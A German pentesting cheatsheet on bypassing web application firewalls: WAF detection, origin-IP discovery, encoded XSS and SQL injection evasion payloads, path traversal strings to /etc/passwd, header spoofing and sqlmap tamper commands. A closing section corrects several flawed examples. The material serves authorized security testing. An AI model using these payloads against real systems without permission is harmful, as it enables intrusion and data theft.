# 🛡️ Cheatsheet zum Umgehen von WAFs

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Web Application Firewalls umgehen
```

---

## 🎯 Was bedeutet WAF-Bypass?

Mit **WAF-Bypass** sind Techniken gemeint, mit denen Penetrationstester eine Web Application Firewall (WAF, Schutzfilter für Webanwendungen) umgehen, den eigentlichen Server erreichen oder Payloads (Angriffsnutzlasten) an die Anwendung übermitteln können.

### Verbreitete WAFs
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

## 🔍 WAF-Erkennung

### wafw00f
```bash
# WAF erkennen
wafw00f https://target.com

# Ausführliche Ausgabe
wafw00f https://target.com -v

# Auf alle unterstützten WAFs prüfen
wafw00f https://target.com -a
```

### Manuelle Erkennung
```bash
# Antwortheader prüfen
curl -I https://target.com

# Auf folgende Merkmale achten:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

## 🌐 IP-Adresse des Ursprungsservers ermitteln

### DNS-Verlauf
```bash
# Zu prüfende Dienste:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Suche nach SSL-Zertifikaten
```bash
# In Censys.io nach Zertifikaten suchen
# Im Zertifikat nach target.com suchen

# crt.sh - Certificate Transparency
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan: Suche über den Hash des SSL-Zertifikats
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Suchabfrage: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### E-Mail-Header
```bash
# Newsletter oder Benachrichtigungen abonnieren
# E-Mail-Header auf die IP-Adresse des Ursprungsservers prüfen

# Auf folgende Merkmale achten:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Subdomains ohne CDN
```bash
# Subdomains ermitteln
subfinder -d target.com -o subs.txt

# Prüfen, welche Subdomains hinter einem CDN liegen
cat subs.txt | httpx -ip

# Auf folgende Merkmale achten:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Favicon-Hash
```bash
# Hash des Favicons berechnen
curl -s https://target.com/favicon.ico | md5sum

# Favicon-Hash für die Suche in Shodan berechnen
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Shodan-Suche
shodan search "http.favicon.hash:HASH_VALUE"
```

### Umgehung über IPv6
```bash
# IPv6 wird möglicherweise nicht durch die WAF abgedeckt
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### IP-Adressbereiche von Cloud-Anbietern
```bash
# IP-Adressbereiche der Cloud-Anbieter herunterladen
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# Ziel-IP außerhalb der Cloud-Adressbereiche: möglicher Ursprungsserver
```

---

## 🔓 Filter durch Kodierung von Payloads umgehen

### URL-Kodierung
```
# Einfache Kodierung
<script> → %3Cscript%3E

# Doppelte Kodierung
<script> → %253Cscript%253E

# Gemischte Kodierung
<script> → %3Cscr%69pt%3E
```

### Unicode-Kodierung
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Unicode-Escape-Sequenzen
<script> → \u003cscript\u003e

# HTML-Zeichenreferenzen
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Groß- und Kleinschreibung verändern
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Nullbytes
```
# Nullbytes einschleusen
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Kommentare
```sql
# SQL-Kommentare
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Inline-Kommentare
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Alternativen zu Leerzeichen
```sql
# Tabulator, Zeilenumbruch, Wagenrücklauf
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Pluszeichen
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 WAF-spezifische Umgehungstechniken

### Umgehung von XSS-Filtern
```html
# Standardvariante wird blockiert
<script>alert(1)</script>

# Varianten zur Umgehung
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Ohne runde Klammern
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Ohne alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Umgehung von SQLi-Filtern
```sql
# UNION-Filter umgehen
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Varianten mit Kommentaren
-- → #
-- → --+
-- → --%00
-- → /**/

# Logische Ausdrücke variieren
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Versionsabhängige Kommentare (MySQL)
/*!50000SELECT*/ → Wird nur bei MySQL >= 5.0 ausgeführt
```

### Umgehung von Path-Traversal-Filtern
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ HTTP-Techniken

### HTTP Parameter Pollution (mehrfach übergebene Parameter)
```http
# Doppelte Parameter
?id=1&id=2
?id=1&ID=2

# Array-Parameter einschleusen
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### HTTP-Methoden manipulieren
```bash
# Methode ändern
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Header zum Überschreiben der Methode
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Header manipulieren
```http
# Header mit vorgetäuschten IP-Adressen
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Unterschiedliche Verarbeitung des Content-Type nutzen
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Chunked Transfer Encoding (Übertragung in Blöcken)
```http
Transfer-Encoding: chunked

4
test
0
```

---

## 🛠️ Werkzeuge

| Werkzeug | Zweck |
|------|---------|
| **wafw00f** | WAF-Erkennung |
| **CloudFlair** | Ursprungsserver hinter Cloudflare ermitteln |
| **Bypass-Firewalls-by-DNS-History** | Suche im DNS-Verlauf |
| **WhatWaf** | WAF-Erkennung und -Umgehung |
| **sqlmap --tamper** | Skripte zur Umgehung von SQLi-Filtern |

### Tamper-Skripte von sqlmap
```bash
# Tamper-Skripte verwenden
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Mehrere Tamper-Skripte kombinieren
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

## 📊 Schnellübersicht

| Technik | Einsatzzweck |
|-----------|----------|
| DNS-Verlauf | IP-Adresse des Ursprungsservers ermitteln |
| SSL-Suche | Zertifikatsuche in Censys/Shodan |
| Subdomain-Enumeration | Subdomains ohne CDN ermitteln |
| Kodierung | Filter umgehen |
| Variation der Groß-/Kleinschreibung | Einfache Regeln umgehen |
| Kommentare | Schlüsselwörter aufteilen |

---

## 📚 Ressourcen

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF Bypass](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Nachweis und Ursprungsserver:** Header, DNS-Verlauf, Zertifikate, ähnliche Favicons und IP-Bereiche liefern Anhaltspunkte, aber keinen sicheren Beleg für einen erreichbaren Ursprungsserver. Eine bekannte IP-Adresse umgeht noch keine Zugriffsbeschränkung. Cloudflare beschreibt unter anderem Netzwerkbeschränkungen, Tunnel und Authenticated Origin Pulls als Schutzmaßnahmen. [Cloudflare: Ursprungsserver schützen](https://developers.cloudflare.com/fundamentals/security/protect-your-origin-server/).
- **Favicon und Suchversionen:** Der MD5-Wert aus dem ersten Aufruf ist nicht der von Shodan verwendete Favicon-Hash. Shodan berechnet MurmurHash3 über die Base64-Darstellung des Bildes. Die Censys-Abfragen der Vorlage enthalten historische Feldnamen; CLI und Suchfelder müssen zum verwendeten Produkt und Datenbestand passen. [Shodan: Favicon-Hash](https://blog.shodan.io/deep-dive-http-favicon/), [Censys: Platform CLI](https://docs.censys.com/docs/platform-cli), [Censys: Abfragesprache](https://docs.censys.com/docs/censys-query-language).
- **Kodierung:** Die als UTF-8 gezeigten Folgen mit C0 sind überlange, ungültige UTF-8-Sequenzen und keine reguläre Zeichenkodierung. Das betrifft auch die entsprechende Path-Traversal-Variante. Ob URL-Kodierung, Unicode-Escapes oder HTML-Zeichenreferenzen wirken, hängt vom jeweiligen Dekodierungs- und Parserkontext ab. [RFC 3629](https://www.rfc-editor.org/rfc/rfc3629.html).
- **SQL-Kommentare:** Die Beispiele sind keine für alle Datenbanken gültigen Umschreibungen. Insbesondere setzt das Einfügen eines Kommentars innerhalb eines Schlüsselworts dieses nicht allgemein wieder zusammen. MySQL verlangt nach der doppelten Bindestrich-Markierung ein Leer- oder Steuerzeichen; versionsabhängige ausführbare Kommentare haben eigene Syntaxregeln. Aktuelle MySQL-Dokumentation sieht nach der Versionsnummer außerdem Whitespace oder das Kommentarende vor. [MySQL: Kommentare](https://dev.mysql.com/doc/refman/8.4/en/comments.html).
- **HTTP und WAF-Regeln:** Die Methodenzeilen und Headerlisten sind schematische Prüffälle, keine vollständigen Requests. Ein geänderter Header oder Content-Type erzwingt keine Umgehung. Chunked Transfer Encoding ist eine reguläre HTTP/1.1-Übertragungsform; das Fragment benötigt im tatsächlichen Nachrichtenformat die vorgeschriebenen CRLF-Grenzen und die abschließende Leerzeile. Es belegt für sich keinen WAF-Bypass. [RFC 9112, Abschnitt 7.1](https://www.rfc-editor.org/rfc/rfc9112.html#section-7.1).

---

<p align="center">
  <b>🛡️ WAFs auf Umgehungsmöglichkeiten prüfen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>
